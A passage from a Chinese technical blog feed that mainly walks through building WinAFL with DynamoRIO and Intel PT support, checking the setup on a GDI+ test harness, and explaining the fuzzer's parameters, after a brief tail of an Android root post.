/path/to/magisk_patched.img</span><br></code></pre></td></tr></table></figure><p>刷完新的修改后的镜像，重启系统，Root 就完成了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>winafl fuzz 工具的使用</title>
    <link href="/cn/winafl/"/>
    <url>/cn/winafl/</url>
    
    <content type="html"><![CDATA[<h2 id="0-下载-Visual-Studio-Community-2022"><a href="#0-下载-Visual-Studio-Community-2022" class="headerlink" title="0. 下载 Visual Studio Community 2022"></a>0. 下载 Visual Studio Community 2022</h2><p>下载地址：<a href="https://aka.ms/vs/17/release/vs_community.exe">https://aka.ms/vs/17/release/vs_community.exe</a></p><p>从微软网站下载并安装 Visual Studio Community 的时候速度只有2 K，一下午没能下载成功。咨询同事小钻风，指出可能是 DNS 问题，将 DNS 切换成阿里的 DNS 223.5.5.5 后下载速度达到 4 M。中国开发者网络总是个问题，大家都挺不容易的。</p><h2 id="1-编译-winafl"><a href="#1-编译-winafl" class="headerlink" title="1. 编译 winafl"></a>1. 编译 winafl</h2><ol><li>下载 <a href="https://github.com/DynamoRIO/dynamorio/releases/download/cronbuild-9.0.19209/DynamoRIO-Windows-9.0.19209.zip">DynamoRIO</a> 解压到 D:\DynamoRIO</li><li>下载 <a href="https://github.com/Kitware/CMake/releases/download/v3.24.0/cmake-3.24.0-windows-x86_64.zip">cmake</a> 解压到 D:\cmake</li><li>从 Github 下载 <a href="https://github.com/googleprojectzero/winafl.git">winafl</a> 编译 intel PT 需要同步 third_party 的源码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/googleprojectzero/winafl.git<br><span class="hljs-built_in">cd</span> winafl<br>git submodule update --init --recursive<br></code></pre></td></tr></table></figure><ol start="4"><li>从菜单中选择  <code>X64 native tool command prompt for VS 2022</code>，执行编译命令</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build64<br>cd build64<br>D:\cmake\bin\cmake.exe -G&quot;Visual Studio 17 2022&quot; -A x64 .. -DDynamoRIO_DIR=D:\DynamoRIO\cmake -DINTELPT=1<br>D:\cmake\bin\cmake.exe --build . --config Release<br></code></pre></td></tr></table></figure><p><code>-DINTelPT=1</code>  参数将编译 Intel PT 模式的支持，编译完成后，可以正常运行</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs applescript">.\build64\bin\Release&gt;.\afl-fuzz.exe<br><br>WinAFL <span class="hljs-number">1.16</span>b <span class="hljs-keyword">by</span> &lt;ifratric@google.com&gt;<br>Based <span class="hljs-keyword">on</span> AFL <span class="hljs-number">2.43</span>b <span class="hljs-keyword">by</span> &lt;lcamtuf@google.com&gt;<br><br>.\afl-fuzz.exe [ afl options ] <span class="hljs-comment">-- [instrumentation options] -- \path\to\fuzzed_app [ ... ]</span><br><br>Required parameters:<br><br>  -i dir        - input directory <span class="hljs-keyword">with</span> test cases<br>  -o dir        - output directory <span class="hljs-keyword">for</span> fuzzer findings<br>  -t msec       - <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">for</span> each <span class="hljs-built_in">run</span><br><br>Instrumentation type:<br><br>  -D dir       - directory <span class="hljs-keyword">with</span> DynamoRIO binaries (drrun, drconfig)<br>  -w winafl    - Path <span class="hljs-keyword">to</span> winafl.dll<br>  -P           - use Intel PT tracing mode<br>  -Y           - enable <span class="hljs-keyword">the</span> static instrumentation mode<br><br>Execution control settings:<br><br>  -f <span class="hljs-built_in">file</span>       - location <span class="hljs-built_in">read</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> fuzzed program (stdin)<br>  -m limit      - memory limit <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> target process<br>  -p            - persist DynamoRIO cache across target process restarts<br>  -c cpu        - <span class="hljs-keyword">the</span> CPU <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> <span class="hljs-keyword">the</span> fuzzed program<br><br>Fuzzing behavior settings:<br><br>  -d            - quick &amp; dirty mode (skips deterministic steps)<br>  -n            - fuzz <span class="hljs-keyword">without</span> instrumentation (dumb mode)<br>  -x dir        - optional fuzzer dictionary (see README)<br><br>Other stuff:<br><br>  -I msec       - <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">for</span> process initialization <span class="hljs-keyword">and</span> <span class="hljs-keyword">first</span> <span class="hljs-built_in">run</span><br>  -T <span class="hljs-built_in">text</span>       - <span class="hljs-built_in">text</span> banner <span class="hljs-keyword">to</span> show <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> screen<br>  -M \ -S <span class="hljs-built_in">id</span>   - distributed mode (see parallel_fuzzing.txt)<br>  -C            - crash exploration mode (<span class="hljs-keyword">the</span> peruvian rabbit thing)<br>  -e            - expert mode <span class="hljs-keyword">to</span> <span class="hljs-built_in">run</span> WinAFL <span class="hljs-keyword">as</span> a DynamoRIO tool<br>  -l path       - a <span class="hljs-built_in">path to</span> user-defined DLL <span class="hljs-keyword">for</span> custom test cases processing<br>  -V            - show <span class="hljs-built_in">version</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exit</span><br><br>Attach:<br><br>  -A module     - attach <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> process <span class="hljs-keyword">that</span> loaded <span class="hljs-keyword">the</span> provided module<br><br>For additional tips, please consult afl_docs\README.<br><br><br>C:\Users\zhouzhen\Downloads\winafl\build64\bin\Release&gt;<br></code></pre></td></tr></table></figure><h2 id="2-检查-DynamoRIO-模式是否正常工作"><a href="#2-检查-DynamoRIO-模式是否正常工作" class="headerlink" title="2. 检查 DynamoRIO 模式是否正常工作"></a>2. 检查 DynamoRIO 模式是否正常工作</h2><p>使用 IDA Pro 对 test_gdiplus.exe 进行反汇编，target_offset 为 <code>0x10E0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.text:00000001400010E0 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:00000001400010E0 main            proc near               ; CODE XREF: __scrt_common_main_seh(void)+107↓p<br>.text:00000001400010E0                                         ; DATA XREF: .rdata:0000000140002B6C↓o ...<br></code></pre></td></tr></table></figure><p>先用 drrun.exe 测试 winafl 是否正常工作，其实就是循环执行 10 次目标程序。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">D:\DynamoRIO\bin64\drrun<span class="hljs-selector-class">.exe</span> -c winafl<span class="hljs-selector-class">.dll</span> -debug ^<br>-target_module test_gdiplus<span class="hljs-selector-class">.exe</span> -target_offset <span class="hljs-number">0</span>x10E0 -fuzz_iterations <span class="hljs-number">10</span> ^<br>-nargs <span class="hljs-number">2</span> -- test_gdiplus<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">input</span>.bmp<br></code></pre></td></tr></table></figure><p>执行命令后，在当前目录下会生成一个 log 文件，文件名为 <code>afl.test_gdiplus.exe.14172.0000.proc.log</code>，内容如下：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">dynamorio</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">winafl</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drx</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drreg</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drmgr</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">drwrap</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-type">test_gdiplus</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">gdiplus</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">VCRUNTIME140</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-type">msvcp_win</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">win32u</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ucrtbase</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">KERNELBASE</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">gdi32full</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">KERNEL32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">msvcrt</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">IMM32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">RPCRT4</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">GDI32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">combase</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">USER32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ntdll</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">UxTheme</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">OLEAUT32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">bcrypt</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">SECHOST</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">ADVAPI32</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">WindowsCodecs</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">Module</span> <span class="hljs-variable">loaded</span><span class="hljs-operator">,</span> <span class="hljs-variable">MSCTF</span><span class="hljs-operator">.</span><span class="hljs-variable">dll</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">pre_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-built_in">In</span> <span class="hljs-type">post_fuzz</span><span class="hljs-type">_handler</span><br><span class="hljs-variable">Everything</span> <span class="hljs-variable">appears</span> <span class="hljs-variable">to</span> <span class="hljs-variable">be</span> <span class="hljs-variable">running</span> <span class="hljs-variable">normally</span><span class="hljs-operator">.</span><br><span class="hljs-variable">Coverage</span> <span class="hljs-variable">map</span> <span class="hljs-variable">follows</span><span class="hljs-operator">:</span><br>                                            <br></code></pre></td></tr></table></figure><p><code>Everything appears to be running normally.</code> 表明 winafl 自己认为没有出错。 log 文件中还包含了其他有用信息，比如说目标程序加载的模块。这些加载的模块可以用来设置 <code>-coverage_module</code>来统计你所关注的 coverage。</p><p>使用 drrun.exe 验证成功后，可以执行下面命令测试 winafl 是否正常工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz.exe -i <span class="hljs-keyword">in</span> -o out -D D:\DynamoRIO\bin64 -t 20000 ^<br>-- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^<br>-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>执行后上面的命令后，如果发现 total paths 的数字在不断变化， winafl 就已经可以正常工作了，恭喜 😄</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+- process timing -------------------------------------+- overall results ----+<br>|<span class="hljs-string">        run time : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  cycles done : 0     </span>|<br>|<span class="hljs-string">   last new path : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  total paths : 2     </span>|<br>|<span class="hljs-string"> last uniq crash : none seen yet                      </span>|<span class="hljs-string"> uniq crashes : 0     </span>|<br>|<span class="hljs-string">  last uniq hang : none seen yet                      </span>|<span class="hljs-string">   uniq hangs : 0     </span>|<br>+- cycle progress --------------------+- map coverage -+----------------------+<br>|<span class="hljs-string">  now processing : 0 (0.00%)         </span>|<span class="hljs-string">    map density : 1.65% / 1.65%        </span>|<br>|<span class="hljs-string"> paths timed out : 0 (0.00%)         </span>|<span class="hljs-string"> count coverage : 1.00 bits/tuple      </span>|<br>+- stage progress --------------------+ findings in depth --------------------+<br>|<span class="hljs-string">  now trying : arith 8\8             </span>|<span class="hljs-string"> favored paths : 1 (50.00%)            </span>|<br>|<span class="hljs-string"> stage execs : 388/389 (99.74%)      </span>|<span class="hljs-string">  new edges on : 2 (100.00%)           </span>|<br>|<span class="hljs-string"> total execs : 619                   </span>|<span class="hljs-string"> total crashes : 0 (0 unique)          </span>|<br>|<span class="hljs-string">  exec speed : 353.3/sec             </span>|<span class="hljs-string">  total tmouts : 0 (0 unique)          </span>|<br>+- fuzzing strategy yields -----------+---------------+- path geometry -------+<br>|<span class="hljs-string">   bit flips : 0/56, 1/55, 0/53                      </span>|<span class="hljs-string">    levels : 2         </span>|<br>|<span class="hljs-string">  byte flips : 0/7, 0/6, 0/4                         </span>|<span class="hljs-string">   pending : 2         </span>|<br>|<span class="hljs-string"> arithmetics : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  pend fav : 1         </span>|<br>|<span class="hljs-string">  known ints : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string"> own finds : 1         </span>|<br>|<span class="hljs-string">  dictionary : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  imported : n/a       </span>|<br>|<span class="hljs-string">       havoc : 0/0, 0/0                              </span>|<span class="hljs-string"> stability : 99.63%    </span>|<br>|<span class="hljs-string">        trim : 0.00%/1, 0.00%                        +-----------------------+</span><br><span class="hljs-string">^C----------------------------------------------------+   [cpu000001:  14%]</span><br></code></pre></td></tr></table></figure><h2 id="3-DynamoRIO-模式-winafl-dll-各个参数的具体含义"><a href="#3-DynamoRIO-模式-winafl-dll-各个参数的具体含义" class="headerlink" title="3. DynamoRIO 模式 winafl.dll 各个参数的具体含义"></a>3. DynamoRIO 模式 winafl.dll 各个参数的具体含义</h2><p>winafl.dll 是 DynamoRIO client (instrumentation) code，参数挺多 Winafl 的 README 中介绍了下面这些参数。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">-covtype         - <span class="hljs-keyword">the</span> type <span class="hljs-keyword">of</span> coverage being recorded. Supported options are<br>                   bb (basic block, default) <span class="hljs-keyword">or</span> edge.<br><br>-coverage_module - module <span class="hljs-keyword">for</span> which <span class="hljs-built_in">to</span> record coverage. Multiple module flags<br>                   are supported.<br><br>-target_module   - module which <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">be</span> <span class="hljs-title">fuzzed</span>.</span><br>                   Either -target_method <span class="hljs-keyword">or</span> -target_offset need <span class="hljs-built_in">to</span> be<br>                   specified together <span class="hljs-keyword">with</span> this option.<br><br>-target_method   - name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> method <span class="hljs-built_in">to</span> fuzz <span class="hljs-keyword">in</span> persistent mode. For this <span class="hljs-built_in">to</span><br>                   work either <span class="hljs-keyword">the</span> method needs <span class="hljs-built_in">to</span> be exported <span class="hljs-keyword">or</span> <span class="hljs-keyword">the</span> symbols<br>                   <span class="hljs-keyword">for</span> target_module need <span class="hljs-built_in">to</span> be available. Otherwise use<br>                   -target_offset instead.<br><br>-target_offset   - <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> method <span class="hljs-built_in">to</span> fuzz <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">start</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> module.<br><br>-fuzz_iterations - Maximum <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> iterations <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">run</span></span><br>                   <span class="hljs-keyword">before</span> restarting <span class="hljs-keyword">the</span> target <span class="hljs-built_in">process</span>.<br><br>-nargs           - Number <span class="hljs-keyword">of</span> arguments <span class="hljs-keyword">the</span> fuzzed method takes. This is used<br>                   <span class="hljs-built_in">to</span> save/restore <span class="hljs-keyword">the</span> arguments between runs.<br><br>-call_convention - The default calling convention is cdecl <span class="hljs-keyword">on</span> <span class="hljs-title">32-bit</span> <span class="hljs-title">x86</span><br>                   platforms <span class="hljs-keyword">and</span> Microsoft x64 <span class="hljs-keyword">for</span> Visual Studio <span class="hljs-number">64</span>-bit<br>                   applications. Possible values:<br>                       * fastcall: fastcall<br>                       * ms64: Microsoft x64 (Visual Studio)<br>                       * stdcall: cdecl <span class="hljs-keyword">or</span> stdcall<br>                       * thiscall: thiscall<br><br>-debug           - Debug mode. Does <span class="hljs-keyword">not</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> server. Outputs<br>                   <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span> <span class="hljs-built_in">file</span> containing loaded modules, opened <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span><br>                   coverage information.<br><br>-logdir          - specifies <span class="hljs-keyword">in</span> which <span class="hljs-built_in">directory</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">log</span> <span class="hljs-built_in">file</span> will be written<br>                   (only <span class="hljs-built_in">to</span> be used <span class="hljs-keyword">with</span> -debug).<br><br>-thread_coverage - If <span class="hljs-built_in">set</span>, WinAFL will only collect coverage <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> thread<br>                   that executed <span class="hljs-keyword">the</span> target <span class="hljs-function"><span class="hljs-keyword">function</span></span><br></code></pre></td></tr></table></figure><ul><li><code>-nargs</code> target method 或者 target offset 的参数个数</li><li><code>-fuzz_iterations</code> 重启进程前，循环执行 target method 或者 target offset 的次数</li><li><code>-target_moudle</code> fuzz 的目标模块，需要和 target method 或者 target offset 一起使用</li><li><code>-target_method</code> persistent mode 下 fuzz 的函数名（方法名），需要有符号 （symbols）</li><li><code>-target_offset</code> fuzz 的函数（方法）相对于模块起始地址的偏移</li><li><code>-coverage_module</code> 统计覆盖率的模块，可以统计多个模块的 coverage，即指定多个 -coverage_module 参数</li><li><code>-covtype</code> bb 或者 edge，bb （basic block 为默认值）</li><li><code> -thread_coverage</code> 用于多线程程序，只统计一个线程执行 target function 的覆盖率变化</li></ul><h2 id="4-WinAFL-intel-PT-模式使用"><a href="#4-WinAFL-intel-PT-模式使用" class="headerlink" title="4. WinAFL intel PT 模式使用"></a>4. WinAFL intel PT 模式使用</h2><p>Intel PT (Processor Tracing) 是 Intel CPU 的一个特性，从 Intel 第5代处理器开始支持，5th generation 的微架构为 <code>Broadwell</code>。相关说明可以参考：<a href="https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html">https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html</a></p><p>Windows 10 从 v1809 开始提供了 Intel PT 的驱动，但目前没有公开的文档描述此驱动，也没有提供官方的 API。 Alex Ionescu 提供了 <a href="https://github.com/ionescu007/winipt">winipt</a> library 和 Intel PT 驱动交互，WinAFL 利用 winipt 来获得 Intel PT 的 Processo Tracing 信息。</p><p>WinAFL 使用 Intel PT 模式，和 DynamoRIO 不同需要指定 <code>-P</code> , WinAFL Intel PT 模式除了和DynamoRIO 相同的参数外额外添加了下面几个参数：</p><ul><li><code>-trace_size</code> 每次执行 traget 手机的 trace 信息的字节数，必须是2 的次方并且大于 4096</li><li><code>-decode</code> 处理 trace 信息的解码器，有三个可选值：<code>tip</code>,  <code>tip_ref</code> 和 <code>full</code> (full 为默认值)</li><li><code>-nopersistent_trace</code> 由于性能的缘故，WinAFL 每次循环执行 target 是不重启程序，这个选项可以强制 WinAFL 每次执行 target 都重启，一般是为了调试才会启用这个选项</li><li><code>-trace_cache_size</code>  trace 信息的 cache 字节数，和 <code>full</code> 解码器一起使用</li></ul><h2 id="5-检查-Intel-PT-模式是否正常工作"><a href="#5-检查-Intel-PT-模式是否正常工作" class="headerlink" title="5. 检查 Intel PT 模式是否正常工作"></a>5. 检查 Intel PT 模式是否正常工作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">winaflpt-debug.exe -debug -coverage_module gdipluss.dll -coverage_module WindowsCodecs.dll ^<br>-fuzz_iterations 10  -target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>上面命令其实和检查 DynamoRIO 模式是否正常工作的命令基本一致，执行命令后输出如下：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 